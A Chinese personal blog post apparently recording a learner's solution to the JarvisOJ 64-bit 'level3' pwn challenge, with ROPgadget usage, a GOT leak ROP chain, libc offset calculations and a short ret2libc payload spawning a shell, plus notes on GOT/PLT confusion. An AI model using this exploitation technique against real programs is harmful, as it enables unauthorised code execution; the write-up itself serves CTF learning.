---
title: JarvisOJ_PWN_Level3_x64
date: 2019-11-20 19:43:28
tags:
- Sec
- CTF
- PWN
- JarvisOJ
categories:
- Sec
- CTF
- PWN
---
# 花絮 #
第一次在没看题解的情况下，独立解题成功？

(⊙﹏⊙)连蒙带猜成功了。。。也算成功了。。。吧？。。。


**前排提醒，文章记录很乱，大概率对别人没什么帮助。愿意看就点下面吧，做好右上角的准备**
<!-- more -->

# 独立解题 #

先明确下要做什么：

首先，需要system 和 '/bin/sh'
	
在64位里，先要让edi寄存器里是'/bin/sh',然后找到system函数的地址
	
查看了下代码这题和level3比较像，是给了第三方的库文件。本身是找不到system和sh的字符串。那么用类似level3的方法找到system和sh地址。

## 获取write_GOT ##
和level3一样的方式，先把运行时内存中write的地址泄露出来。嗯~ o(*￣▽￣*)o用write写write。

不一样的地方在于32位可以直接压栈，但是64位要利用寄存器。自然的想到好朋友，ROPGadget。

> ROPgadget --binary ./level3_64 --only 'pop|ret'

发现了rdi和rsi的，没有找到rdx的。。。

但是看到rsi的指令里，第一个pop是给了rsi，第二个是给了r15.看了下没别的可以利用的了，那就顺手试试吧=。=

    p1 = pad
    p1+= p64(rdi_addr) + p64(1)
    p1+= p64(rsi_addr) + p64(write_got) + p64(8) + p64(write_addr)
    p1+= p64(vuln_addr)

然后读取到输出的地址，u64后给write_mem

## 获取两个地址 ##

这里和level3一样。两者偏移量是一样的。
    
    sys_mem =  libc_sym - libc_write + write_mem
    sh_mem = libc_sh - libc_write + write_mem

## 执行 ##
最后就是构造payload了。

    payload = pad + p64(rdi_addr) + p64(sh_mem) + p64(sys_mem)

测试了下，成功发现了flag，提交正确~

#总结#
两个问题：
1. 对GOT还是不清楚，包括PLT。现在只是知道动态链接的情况下。got在第一次使用后got会保存内存中的地址，而plt是保存了got的地址。那么为什么还要输出write_got存入到另一半变量write_mem呢？在输出后，直接使用write_mem测试了下不行。这块的内容不清楚。。。
2. 在write里有三个参数，根据ROPgadget的显示结果，我只是明确利用了两个，第三个是猜的，竟然成功了？这种成功是必然的还是偶然的？（11.21留：可以通过gdb来查看运行过程中各个寄存器的量。这里因为rdx上次使用时在调用函数时赋值了0x200.所以，对于这个程序，可以不考虑rdx的赋值。）

闲扯两句：
不知道安全之后会怎么样，但也觉得现在写代码不多，无论从什么角度来说，多写些代码，多有些经验都不是坏事，还是要多写点东西的，尽量能自动化的就自动化。

另一个，可能在满足好奇心的情况下，也有了些成就感。越来越觉得二进制挺好玩的，也明白现在只是最初级的阶段，各种保护都是关闭的，嗯。。。继续加油。

话说，昨天晚上查资料时想起来之前导师给了些资料，看了下范围就是我现在都在迷惑的地方。但看书看资料没刷题爽，这两天还是希望继续刷题，再积累些刷题经验。周末两天好好的啃下资料，扎实基础。

加油吧~


**人一我百，人十我万，永不放弃，加油！**